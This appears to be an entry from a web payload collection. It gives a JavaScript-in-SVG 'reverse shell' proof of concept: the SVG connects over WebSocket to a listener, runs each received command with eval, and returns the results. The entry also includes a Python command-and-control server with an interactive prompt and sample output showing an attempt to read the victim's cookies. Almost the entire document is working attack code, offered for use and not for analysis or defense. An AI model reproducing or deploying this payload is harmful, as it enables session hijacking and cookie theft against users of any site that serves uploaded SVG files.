# SVG Payload:

## Reverse Shell POC

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
      const connectWebSocket = () => {
        const socket = new WebSocket("ws://localhost:10443");
        socket.addEventListener("open", (event) => {
          console.log("WebSocket connection established");
        });

        socket.addEventListener("message", (event) => {
          const command = event.data;
          console.log('Received command: ', command);
          try {
            const result = eval(command);
            socket.send(JSON.stringify({ result }));
            console.log(result)
          } catch (error) {
            socket.send(JSON.stringify({ error: error.toString() }));
          }
        });

        socket.addEventListener("close", (event) => {
          console.log('WebSocket connection lost. Retrying in 5 seconds...');
          setTimeout(connectWebSocket, 5000);
        });
      }

      connectWebSocket();
  </script>
</svg>
```

## exemple of Web Socket server 

from[dimondevceo](https://github.com/dimondevceo/reverse_shell_javascript)

```python
import asyncio
import websockets

async def handle_connection(websocket):
    print(f"[+] New client connected: {websocket.remote_address}")
    await websocket.send("Hello, client!")

    while not websocket.closed:
        try:
            await send_message(websocket)
        except websockets.exceptions.ConnectionClosed:
            print(f"[-] Connection closed by client: {websocket.remote_address}")
            break

    print(f"[-] Client disconnected: {websocket.remote_address}")

async def send_message(websocket):
    while True:
        response = await websocket.recv()
        print(response)
        message = input(f"{websocket.remote_address[0]}~# ")
        await websocket.send(message)

async def main():
    async with websockets.serve(handle_connection, "localhost", 10443) as websocket:
        print("[+] WebSocket server started on ws://localhost:10443")
        await asyncio.Future()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("[!] Shutting down server and exiting...")
```

## exemple of paylod

```txt
[+] WebSocket server started on ws://localhost:10443
[+] New client connected: ('::1', 52717, 0, 0)
{"error":"SyntaxError: Unexpected token '!'"}
::1~# document.cookies
```
